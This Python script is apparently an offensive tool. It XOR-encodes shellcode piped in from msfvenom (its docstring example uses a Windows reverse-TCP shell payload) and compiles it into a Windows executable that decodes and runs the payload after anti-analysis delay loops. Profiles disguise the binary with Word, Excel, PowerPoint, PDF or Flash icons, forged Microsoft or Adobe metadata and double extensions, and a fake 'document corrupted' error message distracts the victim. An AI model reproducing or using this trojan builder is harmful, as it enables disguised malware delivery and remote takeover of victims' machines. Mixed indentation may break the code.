"""
XOR-encoded shellcode wrapper for Windows x86-32 (works fine on x86-64)

Example:
$ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.1 LPORT=8080 \
   2>/dev/null | python xor-payload.py -p excel

@_hugsy_

Refs:
- https://msdn.microsoft.com/en-us/library/aa381043(v=vs.85).aspx

ToDo:
- dll generation
- multi byte key
- obfuscate generated C code
"""

import sys
import struct
import random
import tempfile
import os
import subprocess
import argparse

HOME = os.getenv( "HOME" )
MINGW_BIN = HOME + "/.wine/drive_c/MinGW/bin"
ICO_DIR = HOME + "/ico"
PROFILES = {
        # index : [Version, /path/to/ico, CompanyName, Description, Name, CopyrightName]
        "powerpoint":   [ICO_DIR+"/powerpoint.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft PowerPoint presentation", "PowerPoint", "Microsoft PowerPoint", "powerpoint.exe", ".pptx"],
        "word":         [ICO_DIR+"/word.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Word document", "Word", "Microsoft Word", "word.exe", ".docx"],
        "excel":        [ICO_DIR+"/excel.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Excel document", "Excel", "Microsoft Excel", "excel.exe", ".xlsx"],
        "flash":        [ICO_DIR+"/flash.ico", "11,0,0,0", "Adobe Systems Incorporated", "Adobe Flash macro", "Flash", "Adobe Flash", "flash.swf", ".swf"],
        "pdf":          [ICO_DIR+"/pdf.ico", "13,0,0,0", "Adobe Systems Incorporated", "Embedded Adobe PDF document", "Adobe PDF Reader", "Adobe AcroRead", "AcroReader.exe", ".pdf"],
        }

def echo(fd, m):
        os.write(fd, m)
        os.fsync(fd)
        return

def create_application_manifest():
        with open("/tmp/Application.manifest", "w") as f:
                f.write("""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
 <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
  <security>
   <requestedPrivileges>
    <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
   </requestedPrivileges>
  </security>
 </trustInfo>
 <dependency>
  <dependentAssembly>
   <assemblyIdentity type="Win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0"
                     processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"/>
  </dependentAssembly>
 </dependency>
</assembly>""")
        return

def create_resource_file( profile_index ):
        create_application_manifest()

        prof = PROFILES[ profile_index ]
        fd, cname = tempfile.mkstemp(suffix=".rc")
        with os.fdopen(fd, 'w') as f:
                f.write("""id ICON "{0}"
CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST "/tmp/Application.manifest"
1 VERSIONINFO
FILEVERSION      {1}
PRODUCTVERSION   {1}
FILEFLAGS        0
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "080904E4"
    BEGIN
      VALUE "CompanyName", "{2}"
      VALUE "FileDescription", "{3}"
      VALUE "FileVersion", "{1}"
      VALUE "InternalName", "{4}"
      VALUE "LegalCopyright", "{5}"
      VALUE "OriginalFilename", "{6}"
      VALUE "ProductName", "{4}"
      VALUE "ProductVersion", "1.0"
    END
  END

  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x809, 1252
  END
END
""".format(*prof))
        return cname

def generate_code_file(fd, key):
        i = 1
        echo(fd, """#include <sys/types.h>
        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>
        #include <time.h>
        #include <ctype.h>
        #include <windows.h>
        #undef DEBUG

        #define BIG_NUMBER 100000000
        """)


        echo(fd, "unsigned char key = %d;\n" % key)
        echo(fd, 'unsigned char buf[]=\n')
        echo(fd, '"')
        while True:
                c = sys.stdin.read(1)
                if len(c) == 0: break
                a = ord(c) ^ key
                echo(fd, "\\x%.2x" % a)
                if i % 15 == 0:
                        echo(fd, '"\n')
                        echo(fd, '"')
                i += 1
                key = (key + 1)%256
        echo(fd, '";\n')

        echo(fd, """
        DWORD WINAPI SpawnShellcode(LPVOID lpSc)
        {
          __asm__("movl %0, %%eax\\n\\t"
                  "call %%eax"
                  : : "r"(lpSc) : "%eax");
          return 0;
        }
        unsigned char* AllocAndMap(HANDLE *hFile, unsigned char* sc, DWORD dwBytesToRead)
        {
          unsigned char* code; DWORD  dwBytesRead;
          code = VirtualAlloc(NULL, dwBytesToRead, MEM_COMMIT, PAGE_READWRITE);
          if (!code) {
#ifdef DEBUG
            printf("[-] VirtualAlloc\\n");
#endif
            return NULL;
          }
          if (hFile) {
            if( !ReadFile(*hFile, code, dwBytesToRead, &dwBytesRead, NULL) ||
                dwBytesRead != dwBytesToRead ) {
#ifdef DEBUG
              printf("[-] ReadFile\\n");
#endif
              VirtualFree(code, dwBytesToRead, MEM_RELEASE);
              return NULL;
            }
          } else if (sc) {
            code = memcpy(code, sc, dwBytesToRead);
          }
          return code;
        }
        void DecodeShellcode(unsigned char* code, int len)
        {
          unsigned long i,j;
          for(j=BIG_NUMBER; j; j--){}
          for(i=0; i<len; i++){code[i] ^= key++; key %= 256;}
          for(j=BIG_NUMBER; j; j--){}
        }
        //int main(int argc, char** argv, char** envp)
        int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
        {
          int len;
          DWORD pID;
          char* code;
          DWORD lpflOldProtect;
          len = sizeof(buf);
          HANDLE hdlThread;

#ifndef DEBUG
          FreeConsole();
#endif
          code = AllocAndMap(NULL, buf, len);
          if (!code) return -1;

#ifdef DEBUG
          printf("[+] Shellcode alloc-ed at %p\\n", code);
#endif
          if(key){
#ifdef DEBUG
            printf("[+] Decoding using key=%#x\\n", key);
#endif
            DecodeShellcode(code, len);
          }
          if(!VirtualProtect(code, len, PAGE_EXECUTE_READWRITE, &lpflOldProtect)){
#ifdef DEBUG
            printf("[-] failed to set 0x%p as executable\\n", code);
#endif
            VirtualFree(code, len, MEM_RELEASE);
            return 0;
          }
#ifdef DEBUG
          printf("[+] Page %p set as executable\\n", code);
          printf("[+] Detaching from console and triggering shellcode\\n");
          FreeConsole();
#endif
          MessageBoxA(NULL,
                      "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
                      "If this happened for the first time, try re-opening the document."
                      "\\n\\nError code: 0xffffff96"
                      ,
                      "Windows Error",
                      MB_ICONERROR | MB_OK);
          hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);

          WaitForSingleObject(hdlThread, INFINITE);
          VirtualFree(code, len, MEM_RELEASE);
          return 0;
        }
        """)
        os.close(fd)
        return

if __name__ == "__main__":
        profile_name = None
	res_o = ""
        quiet_mode = False
        available_profiles = ["powerpoint", "excel", "word", "flash", "pdf"]

        parser = argparse.ArgumentParser(description=__doc__)
        parser.add_argument("-p", "--profile", default=None, metavar="PROFILE",
                            help="Specify the profile to use ({})".format(available_profiles))
        parser.add_argument("-q", "--quiet", action="store_true", help="Disable verbose output", default=False)
        parser.add_argument("-o", "--output", default=None, help="Specify an output file")
        args = parser.parse_args()

        profile_name = args.profile
        quiet_mode = args.quiet

        if profile_name is not None and profile_name not in available_profiles:
                print("[-] Invalid profile")
                exit(1)

        if not quiet_mode:
                if profile_name is None:
                        print("[+] No profile selected")
                else:
                        print("[+] Using profile %s" % profile_name.title())

        if not quiet_mode: print ("[+] Generating random key")
        key = random.randint(0,255)
        fd, cname = tempfile.mkstemp(suffix=".c")
        if not quiet_mode: print ("[+] Generating code in '{}'".format(cname))
        generate_code_file(fd, key)

        if profile_name is not None:
		resfile = create_resource_file( profile_name )
		res_o = "/tmp/res.o"
		cmd = "cd {} && wine ./windres.exe {} -O coff -o {}".format(MINGW_BIN, resfile, res_o)
		if not quiet_mode: print("[+] Generating resources '{}'->'{}'".format(resfile, res_o))
		ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
		os.unlink(resfile)

	suffix = PROFILES[ profile_name ][7] if profile_name is not None else ""

        if args.output is None:
                f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
                os.close(f)
        else:
                ename = args.output

        cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
        if not quiet_mode: print("[+] Compiling '{}'->'{}'".format(cname, ename))
        ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
        if not quiet_mode: print("[+] Generation completed '{}', removing resources...".format(ename))

	if profile_name is not None:
		os.unlink(res_o)
                os.unlink("/tmp/Application.manifest")

        os.unlink(cname)

        if not quiet_mode:
                print("[+] Success")

        if quiet_mode:
                print("{}".format(ename))

        sys.stdout.flush()
        sys.stderr.flush()
        exit(0)
